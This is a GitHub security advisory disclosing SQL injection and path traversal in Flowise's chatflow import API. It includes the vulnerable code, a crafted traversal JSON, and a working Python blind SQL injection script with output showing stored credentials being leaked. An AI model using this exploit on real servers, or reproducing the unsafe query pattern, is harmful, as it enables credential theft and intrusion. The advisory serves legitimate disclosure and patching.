# [M] FlowiseDB vulnerable to SQL Injection by authenticated users

## Summary
Severity: Medium
Advisory: GHSA-9c4c-g95m-c8cp
CVE: CVE-2025-71332
CWE: CWE-564
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:L (CVSS_V3)
Published: 2025-04-07
Source: https://github.com/advisories/GHSA-9c4c-g95m-c8cp
Type: github-advisory

## Affected
- npm: `flowise` — affected >=0

## Details
### Summary
import functions are vulnerable.
* [importChatflows](https://github.com/FlowiseAI/Flowise/blob/main/packages/server/src/services/chatflows/index.ts#L219)
* [importTools](https://github.com/FlowiseAI/Flowise/blob/main/packages/server/src/services/tools/index.ts#L85)
* [importVariables](https://github.com/FlowiseAI/Flowise/blob/main/packages/server/src/services/variables/index.ts)

### Details
**Authenticated user** can call importChatflows API, import json file such as `AllChatflows.json`.
but Due to insufficient validation to chatflow.id in importChatflows API, 2 issues arise.

**Issue 1 (Bug Type)**
1. Malicious user creates `AllChatflows.json` file by adding `../` and arbitrary path to the chatflow.id of the json file.
    ```json
    {
      "Chatflows": [
        {
          "id": "../../../../../../apikey",
          "name": "clickme",
          "flowData": "{}"
        }
      ]
    }
    ```
2. Victim download this file, and import this to flowise.
3. When victim click created chatflow, victim access to flowise:3000/canvas/{chatflow.id}.

**Issue 2 (Vulnerability Type)**
importChatflows API use unsafe SQL Query.

```javascript
// packages/server/src/services/chatflows/index.ts
const importChatflows = async (newChatflows: Partial<ChatFlow>[]): Promise<any> => {
        try {
        const appServer = getRunningExpressApp()

        // step 1 - check whether file chatflows array is zero
        if (newChatflows.length == 0) return

        // step 2 - check whether ids are duplicate in database
        let ids = '('
        let count: number = 0
        const lastCount = newChatflows.length - 1
        newChatflows.forEach((newChatflow) => {
            ids += `'${newChatflow.id}'`           // <===== user input
            if (lastCount != count) ids += ','
            if (lastCount == count) ids += ')'
            count += 1
        })

        const selectResponse = await appServer.AppDataSource.getRepository(ChatFlow)
            .createQueryBuilder('cf')
            .select('cf.id')
            .where(`cf.id IN ${ids}`)                   // <===== here
            .getMany()
        const foundIds = selectResponse.map((response) => {
            return response.id
        })
```
It changes like `SELECT cf.id FROM cf WHERE cf.id IN ('{USER-INPUT...}')` by the code above.
When  `') {Malicious SQL Query} --` is passed to newChatflow.id, SQL Injection occurs.

### PoC
```python
import argparse
import requests


def import_chatflows(
    url: str,
    token: str,
    payload: dict
):
    response = requests.post(
        f'{url}/api/v1/chatflows/importchatflows',
        headers={
            'Authorization': f'Bearer {token}'
            # 'Authorization': f'Basic {token}'
        },
        json=payload
    )

    return response.json()


def import_normal_data(
    api_url: str,
    token: str,
    normal_data: str
):
    data_id = 'aaaaaa'

    payload = {
        "Chatflows": [
            {
                "id": data_id,
                "name": normal_data,
                "flowData": "{}"
            }
        ]
    }

    import_chatflows(
        url=api_url,
        token=token,
        payload=payload
    )
    return data_id


def get_character(
    api_url: str,
    token: str,
    data_id: str,
    column_name: str,
    index: int
):
    injection_query = f'(SELECT ascii(substr({column_name},{index},1)) FROM credential limit 0,1)'

    def create_payload(
        c: int
    ):
        return f"{data_id}') and if (({injection_query})<{c}, 0, 9e300 * 9e300); -- "

    chatflows_json = {
        "Chatflows": [
            {
                "id": "",
                "name": data_id,
                "flowData": "{}"
            }
        ]
    }

    bitbox = [
        64, 32, 16, 8, 4, 2, 1
    ]
    character = 0
    for bit in bitbox:
        payload = create_payload(c=character + bit)
        chatflows_json['Chatflows'][0]['id'] = payload

        res = import_chatflows(
            url=api_url,
            token=token,
            payload=chatflows_json
        )
        if 'DOUBLE value is out of range' in res['message']:
            # character is more then bit
            character += bit
        else:
            # character is less then bit
            character += 0

    return chr(character)


def get_length(
    api_url: str,
    token: str,
    data_id: str,
    column_name: str
):
    injection_query = f'(SELECT length({column_name}) FROM credential limit 0,1)'

    def create_payload(
        c: int
    ):
        return f"{data_id}') and if (({injection_query})<{c}, 0, 9e300 * 9e300); -- "

    chatflows_json = {
        "Chatflows": [
            {
                "id": "",
                "name": data_id,
                "flowData": "{}"
            }
        ]
    }

    column_len = 0
    bitbox = [
        256, 128, 64, 32, 16, 8, 4, 2, 1
    ]
    for bit in bitbox:
        payload = create_payload(c=column_len + bit)
        chatflows_json['Chatflows'][0]['id'] = payload

        res = import_chatflows(
            url=api_url,
            token=token,
            payload=chatflows_json
        )
        if 'DOUBLE value is out of range' in res['message']:
            # column_len is more then bit
            column_len += bit
        else:
            # column_len is less then bit
            column_len += 0

    return column_len


def main(
    url: str,
    token: str
):
    api_url = url

    column_box = [
        'credentialName',
        'encryptedData'
    ]

    data_id = import_normal_data(
        api_url=api_url,
        token=token,
        normal_data='flow01'
    )

    for column_name in column_box:
        column_len = get_length(
            api_url=api_url,
            token=token,
            data_id=data_id,
            column_name=column_name
        )

        print(f'[+] {column_name} length is {column_len}')

        result = ''
        for i in range(column_len):
            result += get_character(
                api_url=api_url,
                token=token,
                data_id=data_id,
                column_name=column_name,
                index=i + 1
            )

        print(f'[+] {column_name}: {result}')


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument(
        '--url',
        type=str,
        default='http://flowise:3000'
    )
    parser.add_argument(
        '--access',
        type=str,
        required=True,
        help='Get from http://flowise:3000/apikey'
    )

    m_args = parser.parse_args()

    main(
        url=m_args.url,
        token=m_args.access
    )
```

**poc results: encryptedData from flowise database credential table was successfully leaked.**
```
/app # python ex2.py --url http://flowise:3000 --access "blahblah~~~"
[+] credentialName length is 9
[+] credentialName: openAIApi
[+] encryptedData length is 88
[+] encryptedData: U2FsdGVkX19LlIhbD4M9q9reLWQilBY6ffWo2S9PQ669CP1HpMPa5g1h1rJL0ZK3x0UMsLi/8Pz6TbSFrmIZbg==
```

It is recommended to limit all chatflow ids & chat ids to UUID.

### Impact
* Database leak
* Lateral Movement

## References
- https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-9c4c-g95m-c8cp
- https://github.com/FlowiseAI/Flowise/pull/4226
- https://github.com/FlowiseAI/Flowise
